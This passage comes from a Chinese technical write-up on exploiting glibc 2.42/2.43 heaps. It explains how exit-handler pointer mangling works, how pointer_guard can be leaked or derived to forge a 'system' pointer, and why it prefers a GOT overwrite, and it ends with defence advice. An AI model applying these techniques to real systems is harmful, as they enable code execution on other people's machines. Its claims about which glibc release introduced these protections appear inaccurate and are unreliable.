但实测发现 2.42+ 对 exit 函数指针做了 **PTR_MANGLE 指针加密**：

**glibc stdlib/exit.c（2.42+）**

```c
struct exit_function {
  long int flavor;          // ef_cxa = 4
  union {
    void (*at)(void);
    struct { void (*fn)(int status, void *arg); void *arg; void *dso_handle; } cxa;
    ...
  } func;
};
// __run_exit_handlers 调用前（exit.c 108-114 行，ef_cxa 分支）:
cxafct = f->func.cxa.fn;
PTR_DEMANGLE (cxafct);          // 实际是取出后解密，再间接调用
cxafct (arg, status);
```

gdb 实测（断在 `main` 后读取结构与已注册函数指针）：

```plain
gdb -batch -ex 'break main' -ex 'run' \
       -ex 'p/x __exit_funcs' \
       -ex 'p ((struct exit_function_list*)__exit_funcs)->fns[0].func.cxa.fn' \
       ./dbg7
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e38755b3395cf194.png)

`__exit_funcs` 位于 `libc_base + 0x1e8fa0` ，其中已注册函数的指针值为 `0x2f7b33e03c708b0e` ——这是真实函数地址经过 `ptr ^ pointer_guard` 再循环左移 17 位的加密结果。直接覆写明文 `system` 地址会在 `exit()` 解密后变成垃圾地址而崩溃。

因此 2.42+ 覆写 `__exit_funcs` 需要先泄露 `pointer_guard` （TCB+0x30），利用链复杂度显著上升。下面完整展开这套机制。

#### 7.2.1 PTR_MANGLE 完整算法

x86_64 下 glibc 的指针加密宏（ `sysdeps/unix/sysv/linux/x86_64/pointer_guard.h` ，libc 侧）：

```c
# define PTR_MANGLE(var)                                                \
    do {                                                                \
      (var) = (__typeof (var)) ((uintptr_t) (var)                       \
                ^ ((tcbhead_t __seg_fs *)0)->pointer_guard);            \
      asm ("rol $2*" LP_SIZE "+1, %0" : "+r" (var));                    \
    } while (0)

# define PTR_DEMANGLE(var)                                              \
    do {                                                                \
      asm ("ror $2*" LP_SIZE "+1, %0" : "+r" (var));                    \
      (var) = (__typeof (var)) ((uintptr_t) (var)                       \
                ^ ((tcbhead_t __seg_fs *)0)->pointer_guard);            \
    } while (0)
```

`LP_SIZE = 8` ，因此旋转量为 `2*8+1 = 17` 位。加解密公式：

```plain
密文 = ROL17(明文 ^ pointer_guard)
明文 = ROR17(密文) ^ pointer_guard
```

#### 7.2.2 tcbhead_t 布局与 pointer_guard 位置

`sysdeps/x86_64/nptl/tls.h` 中 `tcbhead_t` 定义（字段按 64 位对齐）：

|     |     |     |
| --- | --- | --- |  
| 偏移  | 字段  | 说明  |
| 0x00 | `tcb` | TCB 自指针 |
| 0x08 | `dtv` | 动态线程向量 |
| 0x10 | `self` | 线程描述符指针 |
| 0x18 | `multiple_threads` / `gscope_flag` | 2 × int |
| 0x20 | `sysinfo` | vsyscall 地址 |
| 0x28 | `stack_guard` | 栈 canary |
| **0x30** | `pointer_guard` | **指针加密密钥（攻击目标）** |
| 0x38 | `unused_vgetcpu_cache[2]` | —   |

`fs:0x28` 是 `stack_guard` （栈保护）， `fs:0x30` 是 `pointer_guard` 。二者都在 **主线程 TCB 所在区域** （进程启动时位于栈底附近的高地址侧，8 字节对齐），与栈空间相邻——这给"从栈上泄露 TCB"提供了可能性。

#### 7.2.3 算法与内存密文完全一致

在 Kali 2.43 上运行 `mangle_verify.c` ：程序注册一个自定义 atexit handler（ `my_handler` ），随后遍历 `__exit_funcs` 槽位自动定位其 mangled 密文，并反推 `pointer_guard` 与 `fs:0x30` 实际值比对：

`calc mangled = ROL17(my_handler ^ pointer_guard)` 与内存中 `fns[1]` 槽位的密文完全一致；用该密文反推的 `pointer_guard` 也与 `fs:0x30` 实测值吻合，证明：

-   算法可复现：拿到 `pointer_guard` 即可对任意函数地址（如 `system` ）精确伪造密文；
-   槽位密文可读：UAF 任意读覆盖到 `__exit_funcs` 时，读出的密文 + 已知明文（已注册 handler 地址）可直接反推 `pointer_guard` （ `guard = ROR17(密文) ^ 明文` ）—— **泄露路径不止一种**。

> 注： `__exit_funcs` 各槽位内容随 atexit 注册顺序与 libc 构建浮动（本机 `fns[0]` 为 glibc 预注册条目，自定义 handler 落在 `fns[1]` ），因此验证程序采用"注册自己的 handler → 自动定位槽位"的方式，避免依赖固定槽位明文。 `fns[1]` 的明文 `my_handler` 与密文均由实机打印值交叉验证。

#### 7.2.4 pointer_guard 泄露方案（TCB+0x30）

#### 7.2.5 与 GOT 覆写路径的取舍

|     |     |     |
| --- | --- | --- |  
| 维度  | `__exit_funcs` 覆写 | GOT 覆写（本文主链） |
| 前置泄露 | libc_base + pointer_guard（或明文/密文对） | vuln_base + libc_base |
| 触发方式 | exit() / main 返回（天然可达） | 一次受控 free |
| 需要任意写 | 是（写槽位密文） | 是（写 GOT） |
| 依赖加固 | PTR_MANGLE（2.42+） | Partial RELRO |
| 稳定性 | 中（需先解 guard） | 高（仅需 GOT 可写） |

对 2.43 而言， `__exit_funcs` 是一条 **真实可用但成本更高** 的备选路径；本文主链仍选 GOT 覆写，原因见 7.3。

### 7.3 为何选择 GOT 覆写

|     |     |     |
| --- | --- | --- |  
| 路径  | 依赖  | 2.43 可行性 |
| `__free_hook = system` | 仅 libc_base | 不可行（hook 已移除，符号僵尸化） |
| `__exit_funcs` 覆写 | libc_base + pointer_guard | 困难（PTR_MANGLE 加密） |
| `_rtld_global` exit funcs | ld_base + pointer_guard | 困难（同上，且需先泄露 ld base） |
| FSOP（ `_IO_2_1_stdout_` ） | libc_base + heap | 可行但 vtable 校验严格、payload 复杂 |
| **GOT 覆写（本文）** | vuln_base + libc_base | **最简、稳定** （Partial RELRO 目标） |

> 关于 PIE base：本文 exploit 在本地使用 pwntools 的 `p.libs()` 解析。纯远程场景下，vuln_base 同样可通过标准手段泄露——例如 UAF 读 `link_map` 链表、 `stdout` 结构中的 `_chain` /vtable 指针、或栈上 main 返回地址链等。为避免喧宾夺主，本文聚焦堆利用主链，PIE 泄露按通用前置技术处理。

* * *

## 8\. 防御与检测建议

1.  **源码层面**：所有 `free` 后立即将指针置 `NULL` ，杜绝 UAF； `read` 写入长度必须与 chunk size 强绑定，避免越界覆写元数据。
2.  **编译器层面**：启用 Full RELRO（ `-z now -z relro` ）可关闭 GOT 覆写路径；开启 canary、FORTIFY 等加固选项。
3.  **运行时检测**：部署 heap 完整性监控（如 `MALLOC_CHECK_` 、ASan/Valgrind）；对 `free(): double free detected in tcache` 、 `corrupted size` 等 glibc 报错做实时告警。
4.  **系统层面**：关注 glibc 版本更新，2.42+ 的 `tcache_key` 、PTR_MANGLE 等机制显著提高了利用成本；对暴露在互联网的服务及时升级 libc。

* * *

## 9\. 总结

1.  **懒初始化**： `tcache_perthread_struct` 首次 free 才分配，首个 malloc chunk 固定在 `heap_base + 0x10` ；
2.  **随机** `tcache_key` ：double-free 检测可被"先清零 key"绕过，前提是具备 UAF 写能力；
3.  **safe-linking**：链尾 `fd = chunk_user >> 12` 直接构成 heap 泄露原语；伪造 next 需正确编码且目标 16 字节对齐；
4.  **无 hook 时代**： `__free_hook` 已成僵尸符号， `__exit_funcs` 受 PTR_MANGLE 保护，GOT 覆写（Partial RELRO）仍是低成本的稳定 RCE 路径；
5.  **PTR_MANGLE 可逆**：2.42+ 的 exit 函数指针加密本质是"XOR guard + ROL 17"，算法完全可逆；只要泄露 TCB+0x30 的 `pointer_guard` （或一组明文/密文对），即可精确伪造 `system` 密文完成 RCE——成本高但路径真实。

防护与攻击的博弈从未停止：每次 glibc 加固都在抬高利用成本，但堆利用的本质—— **对内存布局的精确控制**——并未改变。理解这些机制的细节，才能在攻防两端占据主动。

* * *

## 附录：参考与延伸资料

**glibc 源码与版本说明**

-   glibc 官方源码仓库（gitweb）： [https://sourceware.org/git/?p=glibc.git](https://sourceware.org/git/?p=glibc.git)
-   glibc 源码镜像（ `malloc/malloc.c` 在线浏览）： [https://github.com/bminor/glibc/blob/master/malloc/malloc.c](https://github.com/bminor/glibc/blob/master/malloc/malloc.c)
-   glibc 2.43 发布说明（懒初始化、 `TCACHE_MAX_BINS` 扩展）： [https://sourceware.org/glibc/wiki/Release/2.43](https://sourceware.org/glibc/wiki/Release/2.43)
-   glibc 2.42 发布说明（引入 `tcache_key` 、atexit 函数指针 PTR_MANGLE）： [https://sourceware.org/glibc/wiki/Release/2.42](https://sourceware.org/glibc/wiki/Release/2.42)
-   glibc 2.34 发布说明（移除 malloc/free hooks）： [https://sourceware.org/glibc/wiki/Release/2.34](https://sourceware.org/glibc/wiki/Release/2.34)
-   glibc 2.32 发布说明（引入 safe-linking）： [https://sourceware.org/glibc/wiki/Release/2.32](https://sourceware.org/glibc/wiki/Release/2.32)

**机制与利用参考**

-   Check Point Research：glibc "safe-linking" 设计分析： [https://research.checkpoint.com/2020/safe-linking-removing-a-20-year-old-miscalculation-in-glibc-malloc/](https://research.checkpoint.com/2020/safe-linking-removing-a-20-year-old-miscalculation-in-glibc-malloc/)
-   `malloc(3)` / `free(3)` 手册： [https://man7.org/linux/man-pages/man3/malloc.3.html](https://man7.org/linux/man-pages/man3/malloc.3.html)
-   pwntools 使用文档： [https://docs.pwntools.com/](https://docs.pwntools.com/)
